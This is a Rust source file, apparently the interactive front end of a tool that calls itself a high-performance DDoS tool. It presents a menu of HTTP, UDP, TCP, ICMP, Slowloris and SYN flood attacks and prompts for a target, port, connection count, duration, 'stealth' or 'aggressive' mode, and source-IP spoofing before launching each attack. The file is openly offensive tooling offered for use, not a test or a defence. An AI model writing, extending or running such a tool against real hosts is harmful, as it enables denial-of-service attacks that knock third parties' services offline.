use crate::{AttackConfig, UdpFloodConfig, TcpFloodConfig, IcmpFloodConfig, SlowlorisConfig, SynFloodConfig, AppConfig};
use std::io::{self, Write};

pub async fn start_interactive_mode() {
    println!("🎯 高性能DDoS工具 - 交互模式");
    println!("==================================");
    
    // 加载配置文件
    let app_config = AppConfig::load();
    println!("📋 已加载配置文件");
    println!();

    loop {
        println!("请选择攻击类型:");
        println!("1. HTTP/HTTPS 攻击");
        println!("2. UDP 洪水攻击");
        println!("3. TCP 洪水攻击");
        println!("4. ICMP 洪水攻击");
        println!("5. Slowloris 攻击");
        println!("6. SYN 洪水攻击");
        println!("7. 退出");
        println!();

        print!("请输入选择 (1-7): ");
        io::stdout().flush().unwrap();

        let mut choice = String::new();
        io::stdin().read_line(&mut choice).unwrap();
        let choice = choice.trim();

        match choice {
            "1" => {
                if let Some(config) = get_http_config(&app_config) {
                    crate::attack::run_attack(config).await;
                }
            }
            "2" => {
                if let Some(config) = get_udp_config(&app_config) {
                    crate::udp_flood::run_udp_flood(config).await;
                }
            }
            "3" => {
                if let Some(config) = get_tcp_config(&app_config) {
                    crate::tcp_flood::run_tcp_flood(config).await;
                }
            }
            "4" => {
                if let Some(config) = get_icmp_config(&app_config) {
                    crate::icmp_flood::run_icmp_flood(config).await;
                }
            }
            "5" => {
                if let Some(config) = get_slowloris_config(&app_config) {
                    crate::slowloris::run_slowloris(config).await;
                }
            }
            "6" => {
                if let Some(config) = get_syn_config(&app_config) {
                    crate::syn_flood::run_syn_flood(config).await;
                }
            }
            "7" => {
                println!("👋 再见！");
                break;
            }
            _ => {
                println!("❌ 无效选择，请重新输入");
            }
        }

        println!();
        println!("按回车键继续...");
        let mut input = String::new();
        io::stdin().read_line(&mut input).unwrap();
    }
}

fn get_http_config(app_config: &AppConfig) -> Option<AttackConfig> {
    println!("\n🌐 HTTP/HTTPS 攻击配置");
    println!("========================");

    // 目标
    print!("目标IP/域名: ");
    io::stdout().flush().unwrap();
    let mut target = String::new();
    io::stdin().read_line(&mut target).unwrap();
    let target = target.trim().to_string();

    if target.is_empty() {
        println!("❌ 目标不能为空");
        return None;
    }

    // 端口
    print!("端口 (默认80): ");
    io::stdout().flush().unwrap();
    let mut port = String::new();
    io::stdin().read_line(&mut port).unwrap();
    let port = port.trim().parse::<u16>().unwrap_or(80);

    // 并发数
    print!("并发连接数 (默认{}): ", app_config.default_http_connections);
    io::stdout().flush().unwrap();
    let mut connections = String::new();
    io::stdin().read_line(&mut connections).unwrap();
    let connections = connections.trim().parse::<usize>().unwrap_or(app_config.default_http_connections);

    // 持续时间
    print!("持续时间(秒) (默认{}): ", app_config.default_duration);
    io::stdout().flush().unwrap();
    let mut duration = String::new();
    io::stdin().read_line(&mut duration).unwrap();
    let duration = duration.trim().parse::<u64>().unwrap_or(app_config.default_duration);

    // HTTPS
    print!("使用HTTPS? (y/N): ");
    io::stdout().flush().unwrap();
    let mut https = String::new();
    io::stdin().read_line(&mut https).unwrap();
    let https = https.trim().to_lowercase() == "y";

    // HTTP方法
    print!("HTTP方法 (GET/POST, 默认GET): ");
    io::stdout().flush().unwrap();
    let mut method = String::new();
    io::stdin().read_line(&mut method).unwrap();
    let method = method.trim().to_uppercase();
    let method = if method.is_empty() || (method != "GET" && method != "POST") {
        "GET".to_string()
    } else {
        method
    };

    // POST数据
    let post_data = if method == "POST" {
        print!("POST数据: ");
        io::stdout().flush().unwrap();
        let mut data = String::new();
        io::stdin().read_line(&mut data).unwrap();
        let data = data.trim().to_string();
        if data.is_empty() {
            None
        } else {
            Some(data)
        }
    } else {
        None
    };

    // 攻击模式
    print!("攻击模式 (normal/stealth/aggressive, 默认{}): ", app_config.default_mode);
    io::stdout().flush().unwrap();
    let mut mode = String::new();
    io::stdin().read_line(&mut mode).unwrap();
    let mode = mode.trim().to_lowercase();
    let mode = if mode.is_empty() || (mode != "normal" && mode != "stealth" && mode != "aggressive") {
        app_config.default_mode.clone()
    } else {
        mode
    };

    // 自定义User-Agent
    print!("自定义User-Agent (留空使用随机): ");
    io::stdout().flush().unwrap();
    let mut user_agent = String::new();
    io::stdin().read_line(&mut user_agent).unwrap();
    let user_agent = user_agent.trim().to_string();
    let user_agent = if user_agent.is_empty() {
        None
    } else {
        Some(user_agent)
    };

    Some(AttackConfig {
        target,
        port,
        connections,
        duration,
        https,
        method,
        post_data,
        user_agent,
        mode,
    })
}

fn get_udp_config(app_config: &AppConfig) -> Option<UdpFloodConfig> {
    println!("\n🌊 UDP洪水攻击配置");
    println!("===================");

    // 目标
    print!("目标IP/域名: ");
    io::stdout().flush().unwrap();
    let mut target = String::new();
    io::stdin().read_line(&mut target).unwrap();
    let target = target.trim().to_string();

    if target.is_empty() {
        println!("❌ 目标不能为空");
        return None;
    }

    // 端口
    print!("端口 (默认80): ");
    io::stdout().flush().unwrap();
    let mut port = String::new();
    io::stdin().read_line(&mut port).unwrap();
    let port = port.trim().parse::<u16>().unwrap_or(80);

    // 并发数
    print!("并发连接数 (默认{}): ", app_config.default_udp_connections);
    io::stdout().flush().unwrap();
    let mut connections = String::new();
    io::stdin().read_line(&mut connections).unwrap();
    let connections = connections.trim().parse::<usize>().unwrap_or(app_config.default_udp_connections);

    // 持续时间
    print!("持续时间(秒) (默认{}): ", app_config.default_duration);
    io::stdout().flush().unwrap();
    let mut duration = String::new();
    io::stdin().read_line(&mut duration).unwrap();
    let duration = duration.trim().parse::<u64>().unwrap_or(app_config.default_duration);

    // 数据包大小
    print!("数据包大小(字节) (默认{}): ", app_config.default_packet_size);
    io::stdout().flush().unwrap();
    let mut packet_size = String::new();
    io::stdin().read_line(&mut packet_size).unwrap();
    let packet_size = packet_size.trim().parse::<usize>().unwrap_or(app_config.default_packet_size);

    // 攻击模式
    print!("攻击模式 (normal/stealth/aggressive, 默认{}): ", app_config.default_mode);
    io::stdout().flush().unwrap();
    let mut mode = String::new();
    io::stdin().read_line(&mut mode).unwrap();
    let mode = mode.trim().to_lowercase();
    let mode = if mode.is_empty() || (mode != "normal" && mode != "stealth" && mode != "aggressive") {
        app_config.default_mode.clone()
    } else {
        mode
    };

    Some(UdpFloodConfig {
        target,
        port,
        connections,
        duration,
        packet_size,
        mode,
    })
}

fn get_tcp_config(app_config: &AppConfig) -> Option<TcpFloodConfig> {
    println!("\n🌊 TCP洪水攻击配置");
    println!("===================");

    // 目标
    print!("目标IP/域名: ");
    io::stdout().flush().unwrap();
    let mut target = String::new();
    io::stdin().read_line(&mut target).unwrap();
    let target = target.trim().to_string();

    if target.is_empty() {
        println!("❌ 目标不能为空");
        return None;
    }

    // 端口
    print!("端口 (默认80): ");
    io::stdout().flush().unwrap();
    let mut port = String::new();
    io::stdin().read_line(&mut port).unwrap();
    let port = port.trim().parse::<u16>().unwrap_or(80);

    // 并发数
    print!("并发连接数 (默认{}): ", app_config.default_tcp_connections);
    io::stdout().flush().unwrap();
    let mut connections = String::new();
    io::stdin().read_line(&mut connections).unwrap();
    let connections = connections.trim().parse::<usize>().unwrap_or(app_config.default_tcp_connections);

    // 持续时间
    print!("持续时间(秒) (默认{}): ", app_config.default_duration);
    io::stdout().flush().unwrap();
    let mut duration = String::new();
    io::stdin().read_line(&mut duration).unwrap();
    let duration = duration.trim().parse::<u64>().unwrap_or(app_config.default_duration);

    // 数据包大小
    print!("数据包大小(字节) (默认{}): ", app_config.default_packet_size);
    io::stdout().flush().unwrap();
    let mut packet_size = String::new();
    io::stdin().read_line(&mut packet_size).unwrap();
    let packet_size = packet_size.trim().parse::<usize>().unwrap_or(app_config.default_packet_size);

    // 攻击模式
    print!("攻击模式 (normal/stealth/aggressive, 默认{}): ", app_config.default_mode);
    io::stdout().flush().unwrap();
    let mut mode = String::new();
    io::stdin().read_line(&mut mode).unwrap();
    let mode = mode.trim().to_lowercase();
    let mode = if mode.is_empty() || (mode != "normal" && mode != "stealth" && mode != "aggressive") {
        app_config.default_mode.clone()
    } else {
        mode
    };

    // 负载类型
    print!("负载类型 (random/http/custom, 默认random): ");
    io::stdout().flush().unwrap();
    let mut payload_type = String::new();
    io::stdin().read_line(&mut payload_type).unwrap();
    let payload_type = payload_type.trim().to_lowercase();
    let payload_type = if payload_type.is_empty() || (payload_type != "random" && payload_type != "http" && payload_type != "custom") {
        "random".to_string()
    } else {
        payload_type
    };

    // 自定义负载
    let custom_payload = if payload_type == "custom" {
        print!("自定义负载数据: ");
        io::stdout().flush().unwrap();
        let mut payload = String::new();
        io::stdin().read_line(&mut payload).unwrap();
        let payload = payload.trim().to_string();
        if payload.is_empty() {
            None
        } else {
            Some(payload)
        }
    } else {
        None
    };

    Some(TcpFloodConfig {
        target,
        port,
        connections,
        duration,
        packet_size,
        mode,
        payload_type,
        custom_payload,
    })
} 

fn get_icmp_config(app_config: &AppConfig) -> Option<IcmpFloodConfig> {
    println!("\n🌊 ICMP洪水攻击配置");
    println!("===================");

    // 目标
    print!("目标IP/域名: ");
    io::stdout().flush().unwrap();
    let mut target = String::new();
    io::stdin().read_line(&mut target).unwrap();
    let target = target.trim().to_string();

    if target.is_empty() {
        println!("❌ 目标不能为空");
        return None;
    }

    // 并发数
    print!("并发连接数 (默认{}): ", app_config.default_icmp_connections);
    io::stdout().flush().unwrap();
    let mut connections = String::new();
    io::stdin().read_line(&mut connections).unwrap();
    let connections = connections.trim().parse::<usize>().unwrap_or(app_config.default_icmp_connections);

    // 持续时间
    print!("持续时间(秒) (默认{}): ", app_config.default_duration);
    io::stdout().flush().unwrap();
    let mut duration = String::new();
    io::stdin().read_line(&mut duration).unwrap();
    let duration = duration.trim().parse::<u64>().unwrap_or(app_config.default_duration);

    // 数据包大小
    print!("数据包大小(字节) (默认{}): ", app_config.default_packet_size);
    io::stdout().flush().unwrap();
    let mut packet_size = String::new();
    io::stdin().read_line(&mut packet_size).unwrap();
    let packet_size = packet_size.trim().parse::<usize>().unwrap_or(app_config.default_packet_size);

    // 攻击模式
    print!("攻击模式 (normal/stealth/aggressive, 默认{}): ", app_config.default_mode);
    io::stdout().flush().unwrap();
    let mut mode = String::new();
    io::stdin().read_line(&mut mode).unwrap();
    let mode = mode.trim().to_lowercase();
    let mode = if mode.is_empty() || (mode != "normal" && mode != "stealth" && mode != "aggressive") {
        app_config.default_mode.clone()
    } else {
        mode
    };

    // 伪装源IP
    print!("伪装源IP? (y/N): ");
    io::stdout().flush().unwrap();
    let mut spoof_source = String::new();
    io::stdin().read_line(&mut spoof_source).unwrap();
    let spoof_source = spoof_source.trim().to_lowercase() == "y";

    // 随机数据包大小
    print!("随机数据包大小? (y/N): ");
    io::stdout().flush().unwrap();
    let mut random_packet_size = String::new();
    io::stdin().read_line(&mut random_packet_size).unwrap();
    let random_packet_size = random_packet_size.trim().to_lowercase() == "y";

    // 最小数据包大小
    let min_packet_size = if random_packet_size {
        print!("最小数据包大小(字节) (默认64): ");
        io::stdout().flush().unwrap();
        let mut min_size = String::new();
        io::stdin().read_line(&mut min_size).unwrap();
        min_size.trim().parse::<usize>().unwrap_or(64)
    } else {
        64
    };

    // 最大数据包大小
    let max_packet_size = if random_packet_size {
        print!("最大数据包大小(字节) (默认1024): ");
        io::stdout().flush().unwrap();
        let mut max_size = String::new();
        io::stdin().read_line(&mut max_size).unwrap();
        max_size.trim().parse::<usize>().unwrap_or(1024)
    } else {
        1024
    };

    Some(IcmpFloodConfig {
        target,
        connections,
        duration,
        packet_size,
        mode,
        spoof_source,
        random_packet_size,
        min_packet_size,
        max_packet_size,
    })
} 

fn get_slowloris_config(app_config: &AppConfig) -> Option<SlowlorisConfig> {
    println!("\n🐌 Slowloris攻击配置");
    println!("===================");

    // 目标
    print!("目标IP/域名: ");
    io::stdout().flush().unwrap();
    let mut target = String::new();
    io::stdin().read_line(&mut target).unwrap();
    let target = target.trim().to_string();

    if target.is_empty() {
        println!("❌ 目标不能为空");
        return None;
    }

    // 端口
    print!("端口 (默认80): ");
    io::stdout().flush().unwrap();
    let mut port = String::new();
    io::stdin().read_line(&mut port).unwrap();
    let port = port.trim().parse::<u16>().unwrap_or(80);

    // 并发数
    print!("并发连接数 (默认{}): ", app_config.default_slowloris_connections);
    io::stdout().flush().unwrap();
    let mut connections = String::new();
    io::stdin().read_line(&mut connections).unwrap();
    let connections = connections.trim().parse::<usize>().unwrap_or(app_config.default_slowloris_connections);

    // 持续时间
    print!("持续时间(秒) (默认{}): ", app_config.default_duration);
    io::stdout().flush().unwrap();
    let mut duration = String::new();
    io::stdin().read_line(&mut duration).unwrap();
    let duration = duration.trim().parse::<u64>().unwrap_or(app_config.default_duration);

    // 攻击模式
    print!("攻击模式 (normal/stealth/aggressive, 默认{}): ", app_config.default_mode);
    io::stdout().flush().unwrap();
    let mut mode = String::new();
    io::stdin().read_line(&mut mode).unwrap();
    let mode = mode.trim().to_lowercase();
    let mode = if mode.is_empty() || (mode != "normal" && mode != "stealth" && mode != "aggressive") {
        app_config.default_mode.clone()
    } else {
        mode
    };

    // 超时时间
    print!("超时时间(秒) (默认30): ");
    io::stdout().flush().unwrap();
    let mut timeout = String::new();
    io::stdin().read_line(&mut timeout).unwrap();
    let timeout = timeout.trim().parse::<u64>().unwrap_or(30);

    // 保持连接
    print!("保持连接? (y/N): ");
    io::stdout().flush().unwrap();
    let mut keep_alive = String::new();
    io::stdin().read_line(&mut keep_alive).unwrap();
    let keep_alive = keep_alive.trim().to_lowercase() == "y";

    // 随机头部
    print!("随机头部? (y/N): ");
    io::stdout().flush().unwrap();
    let mut random_headers = String::new();
    io::stdin().read_line(&mut random_headers).unwrap();
    let random_headers = random_headers.trim().to_lowercase() == "y";

    // 最小间隔
    print!("最小间隔(毫秒) (默认10): ");
    io::stdout().flush().unwrap();
    let mut min_interval = String::new();
    io::stdin().read_line(&mut min_interval).unwrap();
    let min_interval = min_interval.trim().parse::<u64>().unwrap_or(10);

    // 最大间隔
    print!("最大间隔(毫秒) (默认50): ");
    io::stdout().flush().unwrap();
    let mut max_interval = String::new();
    io::stdin().read_line(&mut max_interval).unwrap();
    let max_interval = max_interval.trim().parse::<u64>().unwrap_or(50);

    Some(SlowlorisConfig {
        target,
        port,
        connections,
        duration,
        mode,
        timeout,
        keep_alive,
        random_headers,
        min_interval,
        max_interval,
    })
}

fn get_syn_config(app_config: &AppConfig) -> Option<SynFloodConfig> {
    println!("\n🌊 SYN洪水攻击配置");
    println!("===================");

    // 目标
    print!("目标IP/域名: ");
    io::stdout().flush().unwrap();
    let mut target = String::new();
    io::stdin().read_line(&mut target).unwrap();
    let target = target.trim().to_string();

    if target.is_empty() {
        println!("❌ 目标不能为空");
        return None;
    }

    // 端口
    print!("端口 (默认80): ");
    io::stdout().flush().unwrap();
    let mut port = String::new();
    io::stdin().read_line(&mut port).unwrap();
    let port = port.trim().parse::<u16>().unwrap_or(80);

    // 并发数
    print!("并发连接数 (默认{}): ", app_config.default_syn_connections);
    io::stdout().flush().unwrap();
    let mut connections = String::new();
    io::stdin().read_line(&mut connections).unwrap();
    let connections = connections.trim().parse::<usize>().unwrap_or(app_config.default_syn_connections);

    // 持续时间
    print!("持续时间(秒) (默认{}): ", app_config.default_duration);
    io::stdout().flush().unwrap();
    let mut duration = String::new();
    io::stdin().read_line(&mut duration).unwrap();
    let duration = duration.trim().parse::<u64>().unwrap_or(app_config.default_duration);

    // 数据包大小
    print!("数据包大小(字节) (默认{}): ", app_config.default_packet_size);
    io::stdout().flush().unwrap();
    let mut packet_size = String::new();
    io::stdin().read_line(&mut packet_size).unwrap();
    let packet_size = packet_size.trim().parse::<usize>().unwrap_or(app_config.default_packet_size);

    // 攻击模式
    print!("攻击模式 (normal/stealth/aggressive, 默认{}): ", app_config.default_mode);
    io::stdout().flush().unwrap();
    let mut mode = String::new();
    io::stdin().read_line(&mut mode).unwrap();
    let mode = mode.trim().to_lowercase();
    let mode = if mode.is_empty() || (mode != "normal" && mode != "stealth" && mode != "aggressive") {
        app_config.default_mode.clone()
    } else {
        mode
    };

    // 伪造源IP
    print!("伪造源IP? (y/N): ");
    io::stdout().flush().unwrap();
    let mut spoof_ip = String::new();
    io::stdin().read_line(&mut spoof_ip).unwrap();
    let spoof_ip = spoof_ip.trim().to_lowercase() == "y";

    Some(SynFloodConfig {
        target,
        port,
        connections,
        duration,
        packet_size,
        mode,
        spoof_ip,
    })
} 